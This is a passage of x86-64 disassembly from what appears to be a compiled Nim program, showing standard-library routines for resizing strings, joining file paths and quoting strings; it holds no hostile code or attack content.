  4045a6:	c3                   	ret

00000000004045a7 <resizeString>:
  4045a7:	57                   	push   %rdi
  4045a8:	56                   	push   %rsi
  4045a9:	53                   	push   %rbx
  4045aa:	48 83 ec 20          	sub    $0x20,%rsp
  4045ae:	48 85 c9             	test   %rcx,%rcx
  4045b1:	48 89 ce             	mov    %rcx,%rsi
  4045b4:	74 4d                	je     404603 <resizeString+0x5c>
  4045b6:	48 03 11             	add    (%rcx),%rdx
  4045b9:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
  4045c0:	ff ff 3f 
  4045c3:	48 23 4e 08          	and    0x8(%rsi),%rcx
  4045c7:	48 89 d3             	mov    %rdx,%rbx
  4045ca:	48 39 ca             	cmp    %rcx,%rdx
  4045cd:	7e 43                	jle    404612 <resizeString+0x6b>
  4045cf:	e8 09 d0 ff ff       	call   4015dd <resize__cOCDWr16YD4j3dBrbbH3yQsystem>
  4045d4:	48 39 c3             	cmp    %rax,%rbx
  4045d7:	48 0f 4c d8          	cmovl  %rax,%rbx
  4045db:	48 83 c6 10          	add    $0x10,%rsi
  4045df:	48 89 d9             	mov    %rbx,%rcx
  4045e2:	e8 6c fa ff ff       	call   404053 <rawNewStringNoInit>
  4045e7:	48 8b 4e f0          	mov    -0x10(%rsi),%rcx
  4045eb:	48 8d 50 10          	lea    0x10(%rax),%rdx
  4045ef:	48 89 d7             	mov    %rdx,%rdi
  4045f2:	48 89 08             	mov    %rcx,(%rax)
  4045f5:	48 ff c1             	inc    %rcx
  4045f8:	f3 a4                	rep movsb (%rsi),(%rdi)
  4045fa:	48 89 58 08          	mov    %rbx,0x8(%rax)
  4045fe:	48 89 c6             	mov    %rax,%rsi
  404601:	eb 0f                	jmp    404612 <resizeString+0x6b>
  404603:	48 89 d1             	mov    %rdx,%rcx
  404606:	48 83 c4 20          	add    $0x20,%rsp
  40460a:	5b                   	pop    %rbx
  40460b:	5e                   	pop    %rsi
  40460c:	5f                   	pop    %rdi
  40460d:	e9 41 fa ff ff       	jmp    404053 <rawNewStringNoInit>
  404612:	48 89 f0             	mov    %rsi,%rax
  404615:	48 83 c4 20          	add    $0x20,%rsp
  404619:	5b                   	pop    %rbx
  40461a:	5e                   	pop    %rsi
  40461b:	5f                   	pop    %rdi
  40461c:	c3                   	ret

000000000040461d <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA>:
  40461d:	41 56                	push   %r14
  40461f:	41 55                	push   %r13
  404621:	41 54                	push   %r12
  404623:	55                   	push   %rbp
  404624:	57                   	push   %rdi
  404625:	56                   	push   %rsi
  404626:	53                   	push   %rbx
  404627:	48 83 ec 60          	sub    $0x60,%rsp
  40462b:	4d 85 c0             	test   %r8,%r8
  40462e:	48 89 cb             	mov    %rcx,%rbx
  404631:	49 89 d4             	mov    %rdx,%r12
  404634:	4c 89 c6             	mov    %r8,%rsi
  404637:	74 14                	je     40464d <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x30>
  404639:	49 8b 00             	mov    (%r8),%rax
  40463c:	48 85 c0             	test   %rax,%rax
  40463f:	7e 07                	jle    404648 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2b>
  404641:	41 8a 44 00 0f       	mov    0xf(%r8,%rax,1),%al
  404646:	eb 1b                	jmp    404663 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x46>
  404648:	40 b7 00             	mov    $0x0,%dil
  40464b:	75 23                	jne    404670 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x53>
  40464d:	48 8b 03             	mov    (%rbx),%rax
  404650:	31 ff                	xor    %edi,%edi
  404652:	48 85 c0             	test   %rax,%rax
  404655:	74 19                	je     404670 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x53>
  404657:	48 8b 10             	mov    (%rax),%rdx
  40465a:	48 85 d2             	test   %rdx,%rdx
  40465d:	7e 11                	jle    404670 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x53>
  40465f:	8a 44 10 0f          	mov    0xf(%rax,%rdx,1),%al
  404663:	3c 5c                	cmp    $0x5c,%al
  404665:	40 0f 94 c7          	sete   %dil
  404669:	3c 2f                	cmp    $0x2f,%al
  40466b:	0f 94 c2             	sete   %dl
  40466e:	09 d7                	or     %edx,%edi
  404670:	4c 8d 6c 24 48       	lea    0x48(%rsp),%r13
  404675:	31 d2                	xor    %edx,%edx
  404677:	48 89 d9             	mov    %rbx,%rcx
  40467a:	e8 42 fe ff ff       	call   4044c1 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg>
  40467f:	ba 18 00 00 00       	mov    $0x18,%edx
  404684:	4c 89 e9             	mov    %r13,%rcx
  404687:	e8 36 d3 ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  40468c:	49 8b 04 24          	mov    (%r12),%rax
  404690:	48 d1 f8             	sar    $1,%rax
  404693:	48 85 c0             	test   %rax,%rax
  404696:	0f 9f 44 24 58       	setg   0x58(%rsp)
  40469b:	7e 37                	jle    4046d4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xb7>
  40469d:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
  4046a2:	31 d2                	xor    %edx,%edx
  4046a4:	31 c9                	xor    %ecx,%ecx
  4046a6:	48 85 f6             	test   %rsi,%rsi
  4046a9:	49 89 c0             	mov    %rax,%r8
  4046ac:	74 03                	je     4046b1 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x94>
  4046ae:	48 8b 0e             	mov    (%rsi),%rcx
  4046b1:	48 39 c1             	cmp    %rax,%rcx
  4046b4:	7e 15                	jle    4046cb <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xae>
  4046b6:	8a 4c 06 10          	mov    0x10(%rsi,%rax,1),%cl
  4046ba:	48 ff c0             	inc    %rax
  4046bd:	80 f9 5c             	cmp    $0x5c,%cl
  4046c0:	75 04                	jne    4046c6 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xa9>
  4046c2:	b2 01                	mov    $0x1,%dl
  4046c4:	eb de                	jmp    4046a4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x87>
  4046c6:	80 f9 2f             	cmp    $0x2f,%cl
  4046c9:	74 f7                	je     4046c2 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xa5>
  4046cb:	84 d2                	test   %dl,%dl
  4046cd:	74 05                	je     4046d4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xb7>
  4046cf:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
  4046d4:	4c 8d 74 24 30       	lea    0x30(%rsp),%r14
  4046d9:	31 c0                	xor    %eax,%eax
  4046db:	48 85 f6             	test   %rsi,%rsi
  4046de:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
  4046e3:	74 03                	je     4046e8 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xcb>
  4046e5:	48 8b 06             	mov    (%rsi),%rax
  4046e8:	48 39 c2             	cmp    %rax,%rdx
  4046eb:	7c 11                	jl     4046fe <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xe1>
  4046ed:	48 8b 03             	mov    (%rbx),%rax
  4046f0:	48 85 c0             	test   %rax,%rax
  4046f3:	0f 85 07 02 00 00    	jne    404900 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2e3>
  4046f9:	e9 08 02 00 00       	jmp    404906 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2e9>
  4046fe:	49 89 f0             	mov    %rsi,%r8
  404701:	4c 89 ea             	mov    %r13,%rdx
  404704:	4c 89 f1             	mov    %r14,%rcx
  404707:	e8 10 d3 ff ff       	call   401a1c <next__am1q4dBd9cls9au5CcmkX5oA>
  40470c:	49 8b 04 24          	mov    (%r12),%rax
  404710:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
  404715:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  40471a:	49 89 c1             	mov    %rax,%r9
  40471d:	49 d1 f9             	sar    $1,%r9
  404720:	75 19                	jne    40473b <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x11e>
  404722:	4c 39 c5             	cmp    %r8,%rbp
  404725:	75 14                	jne    40473b <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x11e>
  404727:	8a 54 2e 10          	mov    0x10(%rsi,%rbp,1),%dl
  40472b:	80 fa 5c             	cmp    $0x5c,%dl
  40472e:	0f 94 c1             	sete   %cl
  404731:	80 fa 2f             	cmp    $0x2f,%dl
  404734:	0f 94 c2             	sete   %dl
  404737:	08 d1                	or     %dl,%cl
  404739:	75 1a                	jne    404755 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x138>
  40473b:	48 8d 55 01          	lea    0x1(%rbp),%rdx
  40473f:	49 39 d0             	cmp    %rdx,%r8
  404742:	75 4c                	jne    404790 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x173>
  404744:	80 7c 2e 10 2e       	cmpb   $0x2e,0x10(%rsi,%rbp,1)
  404749:	75 45                	jne    404790 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x173>
  40474b:	42 80 7c 06 10 2e    	cmpb   $0x2e,0x10(%rsi,%r8,1)
  404751:	74 62                	je     4047b5 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x198>
  404753:	eb 3b                	jmp    404790 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x173>
  404755:	48 8b 0b             	mov    (%rbx),%rcx
  404758:	48 85 c9             	test   %rcx,%rcx
  40475b:	74 14                	je     404771 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x154>
  40475d:	48 8b 01             	mov    (%rcx),%rax
  404760:	48 85 c0             	test   %rax,%rax
  404763:	74 0c                	je     404771 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x154>
  404765:	8a 44 01 0f          	mov    0xf(%rcx,%rax,1),%al
  404769:	3c 5c                	cmp    $0x5c,%al
  40476b:	74 19                	je     404786 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x169>
  40476d:	3c 2f                	cmp    $0x2f,%al
  40476f:	74 15                	je     404786 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x169>
  404771:	ba 5c 00 00 00       	mov    $0x5c,%edx
  404776:	e8 4f fb ff ff       	call   4042ca <addChar>
  40477b:	48 89 d9             	mov    %rbx,%rcx
  40477e:	48 89 c2             	mov    %rax,%rdx
  404781:	e8 3c e7 ff ff       	call   402ec2 <unsureAsgnRef>
  404786:	49 83 0c 24 01       	orq    $0x1,(%r12)
  40478b:	e9 49 ff ff ff       	jmp    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  404790:	31 c0                	xor    %eax,%eax
  404792:	4c 39 c5             	cmp    %r8,%rbp
  404795:	75 08                	jne    40479f <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x182>
  404797:	80 7c 2e 10 2e       	cmpb   $0x2e,0x10(%rsi,%rbp,1)
  40479c:	0f 94 c0             	sete   %al
  40479f:	4c 39 c5             	cmp    %r8,%rbp
  4047a2:	0f 8f 31 ff ff ff    	jg     4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  4047a8:	84 c0                	test   %al,%al
  4047aa:	0f 85 29 ff ff ff    	jne    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  4047b0:	e9 d0 00 00 00       	jmp    404885 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x268>
  4047b5:	4d 85 c9             	test   %r9,%r9
  4047b8:	48 8b 0b             	mov    (%rbx),%rcx
  4047bb:	7f 0a                	jg     4047c7 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1aa>
  4047bd:	48 85 c9             	test   %rcx,%rcx
  4047c0:	75 55                	jne    404817 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1fa>
  4047c2:	e9 83 00 00 00       	jmp    40484a <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x22d>
  4047c7:	45 31 c0             	xor    %r8d,%r8d
  4047ca:	48 85 c9             	test   %rcx,%rcx
  4047cd:	74 03                	je     4047d2 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1b5>
  4047cf:	4c 8b 01             	mov    (%rcx),%r8
  4047d2:	83 e0 01             	and    $0x1,%eax
  4047d5:	49 8d 50 ff          	lea    -0x1(%r8),%rdx
  4047d9:	48 39 d0             	cmp    %rdx,%rax
  4047dc:	7d 16                	jge    4047f4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1d7>
  4047de:	44 8a 4c 11 10       	mov    0x10(%rcx,%rdx,1),%r9b
  4047e3:	41 80 f9 5c          	cmp    $0x5c,%r9b
  4047e7:	74 0b                	je     4047f4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1d7>
  4047e9:	41 80 f9 2f          	cmp    $0x2f,%r9b
  4047ed:	74 05                	je     4047f4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1d7>
  4047ef:	49 89 d0             	mov    %rdx,%r8
  4047f2:	eb e1                	jmp    4047d5 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1b8>
  4047f4:	4d 85 c0             	test   %r8,%r8
  4047f7:	0f 8e dc fe ff ff    	jle    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  4047fd:	e8 02 f9 ff ff       	call   404104 <setLengthStr>
  404802:	48 89 d9             	mov    %rbx,%rcx
  404805:	48 89 c2             	mov    %rax,%rdx
  404808:	e8 b5 e6 ff ff       	call   402ec2 <unsureAsgnRef>
  40480d:	49 83 2c 24 02       	subq   $0x2,(%r12)
  404812:	e9 c2 fe ff ff       	jmp    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  404817:	48 8b 01             	mov    (%rcx),%rax
  40481a:	48 85 c0             	test   %rax,%rax
  40481d:	7e 2b                	jle    40484a <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x22d>
  40481f:	8a 44 01 0f          	mov    0xf(%rcx,%rax,1),%al
  404823:	3c 5c                	cmp    $0x5c,%al
  404825:	74 23                	je     40484a <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x22d>
  404827:	3c 2f                	cmp    $0x2f,%al
  404829:	74 1f                	je     40484a <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x22d>
  40482b:	ba 5c 00 00 00       	mov    $0x5c,%edx
  404830:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
  404835:	e8 90 fa ff ff       	call   4042ca <addChar>
  40483a:	48 89 d9             	mov    %rbx,%rcx
  40483d:	48 89 c2             	mov    %rax,%rdx
  404840:	e8 7d e6 ff ff       	call   402ec2 <unsureAsgnRef>
  404845:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
  40484a:	48 89 ea             	mov    %rbp,%rdx
  40484d:	48 89 f1             	mov    %rsi,%rcx
  404850:	e8 be f5 ff ff       	call   403e13 <substr__2yh9cer0ymNRHlOOg8P7IuA>
  404855:	31 d2                	xor    %edx,%edx
  404857:	48 85 c0             	test   %rax,%rax
  40485a:	48 89 c5             	mov    %rax,%rbp
  40485d:	74 03                	je     404862 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x245>
  40485f:	48 8b 10             	mov    (%rax),%rdx
  404862:	48 8b 0b             	mov    (%rbx),%rcx
  404865:	e8 3d fd ff ff       	call   4045a7 <resizeString>
  40486a:	48 89 d9             	mov    %rbx,%rcx
  40486d:	48 89 c2             	mov    %rax,%rdx
  404870:	e8 4d e6 ff ff       	call   402ec2 <unsureAsgnRef>
  404875:	48 8b 0b             	mov    (%rbx),%rcx
  404878:	48 89 ea             	mov    %rbp,%rdx
  40487b:	e8 23 d1 ff ff       	call   4019a3 <appendString.lto_priv.48>
  404880:	e9 54 fe ff ff       	jmp    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  404885:	48 8b 0b             	mov    (%rbx),%rcx
  404888:	48 85 c9             	test   %rcx,%rcx
  40488b:	74 33                	je     4048c0 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2a3>
  40488d:	48 8b 01             	mov    (%rcx),%rax
  404890:	48 85 c0             	test   %rax,%rax
  404893:	7e 2b                	jle    4048c0 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2a3>
  404895:	8a 44 01 0f          	mov    0xf(%rcx,%rax,1),%al
  404899:	3c 5c                	cmp    $0x5c,%al
  40489b:	74 23                	je     4048c0 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2a3>
  40489d:	3c 2f                	cmp    $0x2f,%al
  40489f:	74 1f                	je     4048c0 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2a3>
  4048a1:	ba 5c 00 00 00       	mov    $0x5c,%edx
  4048a6:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
  4048ab:	e8 1a fa ff ff       	call   4042ca <addChar>
  4048b0:	48 89 d9             	mov    %rbx,%rcx
  4048b3:	48 89 c2             	mov    %rax,%rdx
  4048b6:	e8 07 e6 ff ff       	call   402ec2 <unsureAsgnRef>
  4048bb:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
  4048c0:	48 89 ea             	mov    %rbp,%rdx
  4048c3:	48 89 f1             	mov    %rsi,%rcx
  4048c6:	e8 48 f5 ff ff       	call   403e13 <substr__2yh9cer0ymNRHlOOg8P7IuA>
  4048cb:	31 d2                	xor    %edx,%edx
  4048cd:	48 85 c0             	test   %rax,%rax
  4048d0:	48 89 c5             	mov    %rax,%rbp
  4048d3:	74 03                	je     4048d8 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2bb>
  4048d5:	48 8b 10             	mov    (%rax),%rdx
  4048d8:	48 8b 0b             	mov    (%rbx),%rcx
  4048db:	e8 c7 fc ff ff       	call   4045a7 <resizeString>
  4048e0:	48 89 d9             	mov    %rbx,%rcx
  4048e3:	48 89 c2             	mov    %rax,%rdx
  4048e6:	e8 d7 e5 ff ff       	call   402ec2 <unsureAsgnRef>
  4048eb:	48 8b 0b             	mov    (%rbx),%rcx
  4048ee:	48 89 ea             	mov    %rbp,%rdx
  4048f1:	e8 ad d0 ff ff       	call   4019a3 <appendString.lto_priv.48>
  4048f6:	49 83 04 24 02       	addq   $0x2,(%r12)
  4048fb:	e9 d9 fd ff ff       	jmp    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  404900:	48 83 38 00          	cmpq   $0x0,(%rax)
  404904:	75 0b                	jne    404911 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2f4>
  404906:	48 85 f6             	test   %rsi,%rsi
  404909:	74 06                	je     404911 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2f4>
  40490b:	48 83 3e 00          	cmpq   $0x0,(%rsi)
  40490f:	75 1c                	jne    40492d <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x310>
  404911:	40 0f b6 d7          	movzbl %dil,%edx
  404915:	48 89 d9             	mov    %rbx,%rcx
  404918:	e8 a4 fb ff ff       	call   4044c1 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg>
  40491d:	90                   	nop
  40491e:	48 83 c4 60          	add    $0x60,%rsp
  404922:	5b                   	pop    %rbx
  404923:	5e                   	pop    %rsi
  404924:	5f                   	pop    %rdi
  404925:	5d                   	pop    %rbp
  404926:	41 5c                	pop    %r12
  404928:	41 5d                	pop    %r13
  40492a:	41 5e                	pop    %r14
  40492c:	c3                   	ret
  40492d:	48 8d 0d 5c ca 00 00 	lea    0xca5c(%rip),%rcx        # 411390 <TM__DfU0iuayCGwHDN1Exp9cbKg_2>
  404934:	e8 8a f7 ff ff       	call   4040c3 <copyString>
  404939:	48 89 d9             	mov    %rbx,%rcx
  40493c:	48 89 c2             	mov    %rax,%rdx
  40493f:	e8 7e e5 ff ff       	call   402ec2 <unsureAsgnRef>
  404944:	eb cb                	jmp    404911 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2f4>

0000000000404946 <nosjoinPath>:
  404946:	57                   	push   %rdi
  404947:	56                   	push   %rsi
  404948:	53                   	push   %rbx
  404949:	48 83 ec 30          	sub    $0x30,%rsp
  40494d:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  404954:	00 00 
  404956:	49 89 c8             	mov    %rcx,%r8
  404959:	31 c9                	xor    %ecx,%ecx
  40495b:	48 89 d7             	mov    %rdx,%rdi
  40495e:	4d 85 c0             	test   %r8,%r8
  404961:	74 03                	je     404966 <nosjoinPath+0x20>
  404963:	49 8b 08             	mov    (%r8),%rcx
  404966:	48 03 0f             	add    (%rdi),%rcx
  404969:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
  40496e:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
  404973:	48 8d 5c 24 28       	lea    0x28(%rsp),%rbx
  404978:	e8 cf f3 ff ff       	call   403d4c <rawNewString>
  40497d:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
  404982:	48 89 f2             	mov    %rsi,%rdx
  404985:	48 89 d9             	mov    %rbx,%rcx
  404988:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  40498d:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  404994:	00 00 
  404996:	e8 82 fc ff ff       	call   40461d <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA>
  40499b:	49 89 f8             	mov    %rdi,%r8
  40499e:	48 89 f2             	mov    %rsi,%rdx
  4049a1:	48 89 d9             	mov    %rbx,%rcx
  4049a4:	e8 74 fc ff ff       	call   40461d <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA>
  4049a9:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  4049ae:	48 83 c4 30          	add    $0x30,%rsp
  4049b2:	5b                   	pop    %rbx
  4049b3:	5e                   	pop    %rsi
  4049b4:	5f                   	pop    %rdi
  4049b5:	c3                   	ret

00000000004049b6 <addQuoted__45fPtFhY4FavRaYwDhRfuA>:
  4049b6:	41 57                	push   %r15
  4049b8:	41 56                	push   %r14
  4049ba:	41 55                	push   %r13
  4049bc:	41 54                	push   %r12
  4049be:	55                   	push   %rbp
  4049bf:	57                   	push   %rdi
  4049c0:	56                   	push   %rsi
  4049c1:	53                   	push   %rbx
  4049c2:	48 83 ec 28          	sub    $0x28,%rsp
  4049c6:	48 89 cb             	mov    %rcx,%rbx
  4049c9:	48 8b 09             	mov    (%rcx),%rcx
  4049cc:	48 89 d5             	mov    %rdx,%rbp
  4049cf:	ba 01 00 00 00       	mov    $0x1,%edx
  4049d4:	e8 ce fb ff ff       	call   4045a7 <resizeString>
  4049d9:	48 89 d9             	mov    %rbx,%rcx
  4049dc:	48 89 c2             	mov    %rax,%rdx
  4049df:	e8 de e4 ff ff       	call   402ec2 <unsureAsgnRef>
  4049e4:	48 8b 0b             	mov    (%rbx),%rcx
  4049e7:	48 8d 15 e2 c8 00 00 	lea    0xc8e2(%rip),%rdx        # 4112d0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_15>
  4049ee:	e8 8a cf ff ff       	call   40197d <appendString.part.0>
  4049f3:	48 85 ed             	test   %rbp,%rbp
  4049f6:	75 37                	jne    404a2f <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x79>
  4049f8:	48 8b 0b             	mov    (%rbx),%rcx
  4049fb:	ba 01 00 00 00       	mov    $0x1,%edx
  404a00:	e8 a2 fb ff ff       	call   4045a7 <resizeString>
  404a05:	48 89 d9             	mov    %rbx,%rcx
  404a08:	48 89 c2             	mov    %rax,%rdx
  404a0b:	e8 b2 e4 ff ff       	call   402ec2 <unsureAsgnRef>
  404a10:	48 8b 0b             	mov    (%rbx),%rcx
  404a13:	48 8d 15 b6 c8 00 00 	lea    0xc8b6(%rip),%rdx        # 4112d0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_15>
  404a1a:	48 83 c4 28          	add    $0x28,%rsp
  404a1e:	5b                   	pop    %rbx
  404a1f:	5e                   	pop    %rsi
  404a20:	5f                   	pop    %rdi
  404a21:	5d                   	pop    %rbp
  404a22:	41 5c                	pop    %r12
  404a24:	41 5d                	pop    %r13
  404a26:	41 5e                	pop    %r14
  404a28:	41 5f                	pop    %r15
  404a2a:	e9 4e cf ff ff       	jmp    40197d <appendString.part.0>
  404a2f:	4c 8b 6d 00          	mov    0x0(%rbp),%r13
  404a33:	4c 8d 35 16 c7 00 00 	lea    0xc716(%rip),%r14        # 411150 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_27>
  404a3a:	31 ff                	xor    %edi,%edi
  404a3c:	4c 8d 25 dd c6 00 00 	lea    0xc6dd(%rip),%r12        # 411120 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_28>
  404a43:	4c 8d 3d 66 c7 00 00 	lea    0xc766(%rip),%r15        # 4111b0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_24>
  404a4a:	4c 39 ef             	cmp    %r13,%rdi
  404a4d:	48 8b 0b             	mov    (%rbx),%rcx
  404a50:	7d a6                	jge    4049f8 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x42>
  404a52:	0f be 54 3d 10       	movsbl 0x10(%rbp,%rdi,1),%edx
  404a57:	84 d2                	test   %dl,%dl
  404a59:	89 d6                	mov    %edx,%esi
  404a5b:	0f 88 3a 02 00 00    	js     404c9b <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x2e5>
  404a61:	80 fa 21             	cmp    $0x21,%dl
  404a64:	0f 8f 8f 00 00 00    	jg     404af9 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x143>
  404a6a:	80 fa 20             	cmp    $0x20,%dl
  404a6d:	0f 8d 28 02 00 00    	jge    404c9b <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x2e5>
  404a73:	80 fa 0a             	cmp    $0xa,%dl
  404a76:	0f 84 17 01 00 00    	je     404b93 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x1dd>
  404a7c:	7f 39                	jg     404ab7 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x101>
  404a7e:	80 fa 08             	cmp    $0x8,%dl
  404a81:	0f 84 ca 00 00 00    	je     404b51 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x19b>
  404a87:	0f 8f e5 00 00 00    	jg     404b72 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x1bc>
  404a8d:	80 fa 07             	cmp    $0x7,%dl
  404a90:	0f 85 b8 01 00 00    	jne    404c4e <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x298>
  404a96:	ba 02 00 00 00       	mov    $0x2,%edx
  404a9b:	e8 07 fb ff ff       	call   4045a7 <resizeString>
  404aa0:	48 89 d9             	mov    %rbx,%rcx
  404aa3:	48 89 c2             	mov    %rax,%rdx
  404aa6:	e8 17 e4 ff ff       	call   402ec2 <unsureAsgnRef>
  404aab:	48 8d 15 fe c7 00 00 	lea    0xc7fe(%rip),%rdx        # 4112b0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_16>
  404ab2:	e9 8d 01 00 00       	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404ab7:	80 fa 0c             	cmp    $0xc,%dl
  404aba:	0f 84 12 01 00 00    	je     404bd2 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x21c>
  404ac0:	0f 8c ee 00 00 00    	jl     404bb4 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x1fe>
  404ac6:	80 fa 0d             	cmp    $0xd,%dl
  404ac9:	0f 84 21 01 00 00    	je     404bf0 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x23a>
  404acf:	80 fa 1b             	cmp    $0x1b,%dl
  404ad2:	0f 85 76 01 00 00    	jne    404c4e <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x298>
  404ad8:	ba 02 00 00 00       	mov    $0x2,%edx
  404add:	e8 c5 fa ff ff       	call   4045a7 <resizeString>
  404ae2:	48 89 d9             	mov    %rbx,%rcx
  404ae5:	48 89 c2             	mov    %rax,%rdx
  404ae8:	e8 d5 e3 ff ff       	call   402ec2 <unsureAsgnRef>
  404aed:	48 8d 15 dc c6 00 00 	lea    0xc6dc(%rip),%rdx        # 4111d0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_23>
  404af4:	e9 4b 01 00 00       	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404af9:	80 fa 5b             	cmp    $0x5b,%dl
  404afc:	7f 3c                	jg     404b3a <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x184>
  404afe:	80 fa 28             	cmp    $0x28,%dl
  404b01:	0f 8d 94 01 00 00    	jge    404c9b <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x2e5>
  404b07:	80 fa 26             	cmp    $0x26,%dl
  404b0a:	0f 8f 18 01 00 00    	jg     404c28 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x272>
  404b10:	80 fa 23             	cmp    $0x23,%dl
  404b13:	0f 8d 82 01 00 00    	jge    404c9b <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x2e5>
  404b19:	ba 02 00 00 00       	mov    $0x2,%edx
  404b1e:	e8 84 fa ff ff       	call   4045a7 <resizeString>
  404b23:	48 89 d9             	mov    %rbx,%rcx
  404b26:	48 89 c2             	mov    %rax,%rdx
  404b29:	e8 94 e3 ff ff       	call   402ec2 <unsureAsgnRef>
  404b2e:	48 8d 15 3b c6 00 00 	lea    0xc63b(%rip),%rdx        # 411170 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_26>
